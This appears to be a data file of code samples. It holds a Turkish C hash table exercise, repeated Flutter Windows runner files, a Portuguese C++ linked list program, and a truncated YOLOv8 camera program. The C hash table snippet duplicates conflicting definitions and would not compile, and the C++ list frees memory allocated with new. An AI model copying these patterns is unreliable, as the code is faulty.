    "//birinci k\u0131s\u0131m\r\n#include<stdio.h>\r\n#include<stdlib.h>\r\n#include<string.h>\r\n#define tablo_boyutu adet\r\nint adet = 5;\r\ntypedef struct Liste {\r\n\tint index;\r\n\tint musteri_numarasi;\r\n\tchar musteri_ad[100];\r\n\tchar musteri_soyad[100];\r\n\tstruct Liste * sonraki;\r\n} Row;\r\n\r\ntypedef struct Tablo {\r\n\tRow satirlar[];\r\n} Tablo;\r\n\r\nTablo Tablolar;\r\n\r\nvoid initialise() { //Olu\u015fturulan listeye -1 de\u011ferlerini at\u0131yorum\r\n\tfor(int i = 0; i < tablo_boyutu; i++) {\r\n\t\tTablolar.satirlar[i].musteri_numarasi = -1;\r\n\t\tTablolar.satirlar[i].index = -1;\r\n\t\tTablolar.satirlar[i].musteri_numarasi = -1;\r\n\t\tTablolar.satirlar[i].sonraki = NULL;\r\n\t}\r\n}\r\nint Hash(int numara) { //Mod \u0130\u015flemini yapt\u0131\u011f\u0131m fonksiyon\r\n\treturn (numara % tablo_boyutu);\r\n}\r\n\r\n\r\nint adet = 5;\r\ntypedef struct Liste {\r\n\tint index;\r\n\tint link;\r\n\tint musteri_numarasi;\r\n\tchar musteri_ad[100];\r\n\tchar musteri_soyad[100];\r\n} Row;\r\n\r\ntypedef struct tablo {\r\n\tRow satirlar[];\r\n} Tablo;\r\n\r\nTablo Tablolar;\r\n\r\nvoid initialize() { //Olu\u015fturulan listeye -1 de\u011ferlerini atad\u0131m\r\n\tfor(int i = 0; i < tablo_boyutu; i++){\r\n\t    Tablolar.satirlar[i].index = -1;\r\n\t\tTablolar.satirlar[i].musteri_numarasi = -1;\r\n\t\tTablolar.satirlar[i].link = -1;\r\n\t}\r\n}\r\n\r\nint hash(int numara){ //Mod \u0130\u015flemini yapt\u0131\u011f\u0131m fonksiyon\r\n\treturn (numara % tablo_boyutu);\r\n}\r\n\r\nvoid ekle(int musteri_numarasi, char * musteri_ad, char * musteri_soyad) { \r\n\tint adres = hash(musteri_numarasi), gecici = adres; //adres de\u011fi\u015fkenine m\u00fc\u015fteri numaras\u0131n\u0131n modunu al\u0131p atad\u0131m.\r\n\tif(Tablolar.satirlar[adres].index == -1){ //e\u011fer listedeki index bo\u015fsa(-1 ise) fonksiyona parametre olarak gelen de\u011ferleri atad\u0131m.\r\n\t\tTablolar.satirlar[adres].index=adres;\r\n\t\tTablolar.satirlar[adres].musteri_numarasi = musteri_numarasi;\r\n\t\tstrcpy(Tablolar.satirlar[adres].musteri_ad, musteri_ad);\r\n\t\tstrcpy(Tablolar.satirlar[adres].musteri_soyad, musteri_soyad);\r\n\t}\r\n\telse {\r\n\t\tint gecici_boyut = 0, gecici_boyut2 = 0;\r\n\t\tadres = 0;\r\n\t\twhile(gecici_boyut != tablo_boyutu){ //s\u0131r\u0131dan ba\u015flat\u0131p t\u00fcm listeyi gezen while d\u00f6ng\u00fcs\u00fc\r\n\t\t\tif(Tablolar.satirlar[adres].index == -1){ //0. indexteki bo\u015fsa parametre olarak gelenleri e\u015fitliyorum.\r\n\t\t\t\tTablolar.satirlar[adres].index = adres;\r\n\t\t\t\tTablolar.satirlar[adres].musteri_numarasi = musteri_numarasi;\r\n\t\t\t\tstrcpy(Tablolar.satirlar[adres].musteri_ad, musteri_ad);\r\n\t\t\t\tstrcpy(Tablolar.satirlar[adres].musteri_soyad, musteri_soyad);\r\n\t\t\t\tif(Tablolar.satirlar[gecici].link == -1){ //E\u011fer listenin linki bo\u015fsa gecicideki linke o an adresteki linki at\u0131yorum.\r\n\t\t\t\t\tTablolar.satirlar[gecici].link = Tablolar.satirlar[adres].index;\r\n\t\t\t\t\treturn;\r\n\t\t\t\t}\r\n\t\t\t\telse { \r\n\t\t\t\t\twhile(gecici_boyut2 != tablo_boyutu - 1){\r\n\t\t\t\t\t\tif(hash(Tablolar.satirlar[gecici_boyut2].musteri_numarasi) == gecici && Tablolar.satirlar[gecici_boyut2].link == -1){ //gecici olarak yeniden atad\u0131\u011f\u0131m 0 de\u011ferindeki m\u00fc\u015fteri numaras\u0131n\u0131 hash fonksiyonuna g\u00f6nderdim. d\u00f6nen de\u011fer ile o indexteki link bo\u015fsa ona ba\u011flad\u0131m.\r\n\t\t\t\t\t\t\tTablolar.satirlar[gecici_boyut2].link = Tablolar.satirlar[adres].index;\r\n\t\t\t\t\t\t\tprintf(\"Tum Musteriler Basariyla Eklendi!\\n\");\r\n\t\t\t\t\t\t\treturn;\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t\tgecici_boyut2++;\r\n\t\t\t\t\t}\r\n\t\t\t\t\tprintf(\"Hata Olustu! Musteri Eklenemedi!\\n\");\t\t\t\t\t\t\r\n\t\t\t\t}\t\t\t\t\r\n\t\t\t\treturn;\r\n\t\t\t}\r\n\t\t\tadres++;\r\n\t\t\tgecici_boyut++;\r\n\t\t}\r\n\t\tprintf(\"Tablo Dolu!\\n\");\r\n\t\treturn;\r\n\t}\r\n}\r\n\r\nint ara(int musteri_numarasi){\r\n\tint adres = hash(musteri_numarasi), gecici = adres, sayac = 0;\r\n\tif(Tablolar.satirlar[adres].musteri_numarasi == musteri_numarasi){ //E\u011fer arad\u0131\u011f\u0131m\u0131z de\u011fer ilk listede yani direk bulabiliyorsak buras\u0131 \u00e7al\u0131\u015f\u0131yor.\r\n\t\tprintf(\"%d Numarali Musteri %d Adimda Bulundu!\\n\", musteri_numarasi, ++sayac);\r\n\t\treturn 0;\r\n\t}\r\n\telse {\t\r\n\t\tint gecici_boyut = 0;\r\n\t\twhile(gecici_boyut != tablo_boyutu){\r\n\t\t\tsayac++;\r\n\t\t\tif(Tablolar.satirlar[Tablolar.satirlar[adres].link].musteri_numarasi == musteri_numarasi){ //e\u011fer linke g\u00f6re arama yapmak gerekirse buras\u0131 \u00e7al\u0131\u015f\u0131yor. adresteki linke bak\u0131p gelen de\u011fer ayn\u0131 m\u0131 diye kontrol ediyor. de\u011filse di\u011fer adrese y\u00fckseltiyorum.\r\n\t\t\t\tprintf(\"%d Numarali Musteri %d Adimda Bulundu!\\n\", musteri_numarasi, sayac);\r\n\t\t\t\treturn 0;\r\n\t\t\t}\r\n\t\t\tif(hash(Tablolar.satirlar[gecici_boyut].musteri_numarasi) == gecici){ //linke g\u00f6re arama yapt\u0131\u011f\u0131m\u0131zda \u00f6nceki linki takip edebilmek i\u00e7in adresi g\u00fcncelliyorum.\r\n\t\t\t\tadres = gecici_boyut;\r\n\t\t\t}\r\n\t\t\tgecici_boyut++;\r\n\t\t}\r\n\t\tprintf(\"Aradiginiz Musteri Bulunamadi!\\n\");\r\n\t\treturn -1;\r\n\t}\r\n}\r\n\r\nvoid listele(){\r\n\tprintf(\"Index\\tNumara\\tAdi\\tSoyadi\\tLink\\n\");\r\n\tprintf(\"--------------------------------------\\n\");\r\n \tfor(int i = 0; i < tablo_boyutu; i++){\r\n\t\tprintf(\"%d \\t\", i);\r\n\t\tprintf(\"%d \\t\", Tablolar.satirlar[i].musteri_numarasi);\r\n\t\tprintf(\"%s \\t\", Tablolar.satirlar[i].musteri_ad);\r\n\t\tprintf(\"%s \\t\", Tablolar.satirlar[i].musteri_soyad);\r\n\t\tprintf(\"%d \\t\", Tablolar.satirlar[i].link); \t\t\t\r\n\t\tprintf(\"\\n\");\r\n\t}\r\n}\r\n\r\nint main(){\r\n\tprintf(\"Uygulama 2\\n\");\r\n\tprintf(\"Tablo Boyutu Giriniz: \");\r\n\tscanf(\"%d\", &adet);\r\n\ttablo_boyutu = adet;\r\n\tinitialize();\r\n\tekle(10, \"faruk\", \"ipek\");\r\n\tekle(13, \"tarik\", \"cakir\");\r\n\tekle(23, \"ahmet\", \"yilmaz\");\r\n\tekle(",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <iostream>\n#include <locale.h>\n#include <string>\nusing namespace std;\n\nstruct Funcionario {\n\tint prontuario;\n\tstring nome;\n\tdouble salario;\n\tFuncionario *prox;\n};\n\nFuncionario* init() {\n\treturn NULL;\n}\n\nbool isEmpty(Funcionario* lista) {\n\treturn (lista == NULL);\n}\n\nFuncionario* insert(Funcionario* lista, int prontuario, string nome, double salario) {\n\tFuncionario* novo = new Funcionario();\n\tnovo->prontuario = prontuario;\n\tnovo->nome = nome;\n\tnovo->salario = salario;\n\tnovo->prox = lista;\n\treturn novo;\n};\n\nvoid printLista(Funcionario* lista) {\n\tFuncionario* aux;\n\tstring line(20, '-');\n\taux = lista;\n\tdouble totalSalarios = 0;\n\tif (isEmpty(lista)) {\n\t\tcout << \"Lista vazia.\" << endl;\n\t} else {\n\t\tcout << \"Lista de funcion\u00e1rios: \\n\" << endl;\n\t\tcout << line << endl;\n\t\twhile (aux != NULL) {\n\t\t\tcout << \"Prontu\u00e1rio: \" << aux->prontuario << endl;\n\t\t\tcout << \"Nome: \" << aux->nome << endl;\n\t\t\tcout << \"Sal\u00e1rio: \" << aux->salario << endl;\n\t\t\tcout << line << endl;\n\t\t\ttotalSalarios = totalSalarios + aux->salario;\n\t\t\taux = aux->prox;\n\t\t}\n\t\tcout << \"\\nTotal de sal\u00e1rios: \" << totalSalarios << endl;\n\t\tcout << \"\\nFim da lista.\" << endl;\n\t}\n}\n\nvoid printFuncionario(Funcionario* lista, int prontuario) {\n\tFuncionario* aux;\n\taux = lista;\n\twhile (aux != NULL && aux->prontuario != prontuario) {\n\t\taux = aux->prox;\n\t}\n\tif (aux) {\n\t\tcout << \"\\nFuncion\u00e1rio encontrado: \" << endl;\n\t\tcout << endl;\n\t\tcout << \"Prontu\u00e1rio: \" << aux->prontuario << endl;\n\t\tcout << \"Nome: \" << aux->nome << endl;\n\t\tcout << \"Sal\u00e1rio: \" << aux->salario << endl;\n\t} else {\n\t\tcout << \"\\nFuncion\u00e1rio n\u00e3o encontrado.\" << endl;\n\t}\n}\n\nFuncionario* find(Funcionario* lista, int prontuario) {\n\tFuncionario* aux;\n\taux = lista;\n\twhile (aux != NULL && aux->prontuario != prontuario) {\n\t\taux = aux->prox;\n\t}\n\treturn aux;\n}\n\nFuncionario* remove(Funcionario* lista, int prontuario) {\n\tFuncionario* aux;\n\tFuncionario* ant = NULL;\n\taux = lista;\n\n\twhile (aux != NULL && aux->prontuario != prontuario) {\n\t\tant = aux;\n\t\taux = aux->prox;\n\t}\n\n\tif (aux == NULL) {\n\t\treturn lista;\n\t}\n\n\tif (ant == NULL) {\n\t\tlista = aux->prox;\n\t}\n\n\telse {\n\t\tant->prox = aux->prox;\n\t}\n\n\tfree(aux);\n\treturn lista;\n}\n\nvoid freeLista(Funcionario* lista) {\n\tFuncionario* aux;\n\taux = lista;\n\twhile (aux != NULL) {\n\t\tFuncionario *ant = aux->prox;\n\t\tfree(aux);\n\t\taux = ant;\n\t}\t\n}\n\nint main() {\n\tsetlocale(LC_ALL, \"\");\n\t\n  \tFuncionario *listaFuncionarios;\n\tlistaFuncionarios = init();\n\tint prontuario;\n\tstring nome;\n\tdouble salario;\n  \tint opcao;\n  \n  \tdo {\n\t\tstring line(40, '-');\n\t\tcout << \"0. Sair\\n\";\n\t\tcout << \"1. Incluir\\n\";\n\t\tcout << \"2. Excluir\\n\";\n\t\tcout << \"3. Pesquisar\\n\";\n\t\tcout << \"4. Listar\\n\";\n\t\tcout << \"Op\u00e7\u00e3o: \";\n\t\tcin >> opcao;\n\n    \t\tswitch (opcao) {\n\t\t\tcase 0:\n\t\t\t\tcout << line << endl;\n\t\t\t\tcout << \"Encerrando programa...\\n\";\n\t\t\t\tbreak;\n\t\t\t\n\t\t\tcase 1:\n\t\t\t\tcout << line << endl;\n        \t\t\tcout << \"Digite o prontuario: \";\n\t\t\t\tcin >> prontuario;\n\t\t\t\tif (find(listaFuncionarios, prontuario)) {\n\t\t\t\t\tcout << \"Funcion\u00e1rio j\u00e1 cadastrado!\\n\";\n\t\t\t\t\tcout << line << endl;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tcout << \"Digite o nome: \";\n\t\t\t\tcin >> nome;\n        \t\t\tcout << \"Digite o salario: \";\n\t\t\t\tcin >> salario;\n\t\t\t\tlistaFuncionarios = insert(listaFuncionarios, prontuario, nome, salario);\n        \t\t\tcout << \"Funcion\u00e1rio cadastrado com sucesso!\" << endl;\n\t\t\t\tcout << line << endl;\n\t\t\tbreak;\n\n\t\t\tcase 2:\n\t\t\t\tcout << line << endl;\n\t\t\t\tcout << \"Digite o prontu\u00e1rio do funcion\u00e1rio a ser exclu\u00eddo: \";\n\t\t\t\tcin >> prontuario;\n\t\t\t\tlistaFuncionarios = remove(listaFuncionarios, prontuario);\n\t\t\t\tcout << \"Funcion\u00e1rio exclu\u00eddo com sucesso!\" << endl;\n\t\t\t\tcout << line << endl;\n\t\t\tbreak;\n\t\t\t\n\t\t\tcase 3:\n\t\t\t\tcout << line << endl;\n\t\t\t\tcout << \"Digite o prontu\u00e1rio do funcion\u00e1rio a ser pesquisado: \";\n\t\t\t\tcin >> prontuario;\n\t\t\t\tprintFuncionario(listaFuncionarios, prontuario);\n\t\t\t\tcout << line << endl;\n\t\t\tbreak;\n\n\t\t\tcase 4:\n\t\t\t\tcout << line << endl;\n\t\t\t\tprintLista(listaFuncionarios);\n\t\t\t\tcout << line << endl;\n\t\t}  \t\n  } while (opcao != 0);\n\n\tfreeLista(listaFuncionarios);\n\n\treturn 0;\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "//\n// Created by ubuntu on 1/20/23.\n//\n#include \"chrono\"\n#include \"yolov8.hpp\"\n#include \"opencv2/opencv.hpp\"\n\nconst std::vector<std::string> CLASS_NAMES = {\n\t\"car\", \"motorcycle\"};\n\nconst std::vector<std::vector<unsigned int>> COLORS = {\n\t{ 0, 255, 0 }, { 0, 0, 255 }\n};\n\n// Function to generate the GStreamer pipeline string\nstd::string gstreamer_pipeline (int capture_width, int capture_height, int display_width, int display_height, int framerate, int flip_method) {\n    return \"nvarguscamerasrc ! video/x-raw(memory:NVMM), width=(int)\" + std::to_string(capture_width) + \", height=(int)\" +\n           std::to_string(capture_height) + \", framerate=(fraction)\" + std::to_string(framerate) +\n           \"/1 ! nvvidconv flip-method=\" + std::to_string(flip_method) + \" ! video/x-raw, width=(int)\" + std::to_string(display_width) + \", height=(int)\" +\n           std::to_string(display_height) + \", format=(string)BGRx ! videoconvert ! video/x-raw, format=(string)BGR ! appsink\";\n}\n\nint main(int argc, char** argv) {\n    // Read command line arguments\n    const std::string engine_file_path{argv[1]};\n    const std::string input_type{argv[2]};\n    std::string input_value;\n    int infer_rate;\n    std::string output_type;\n\n    // Variables for video processing\n    std::vector<std::string> 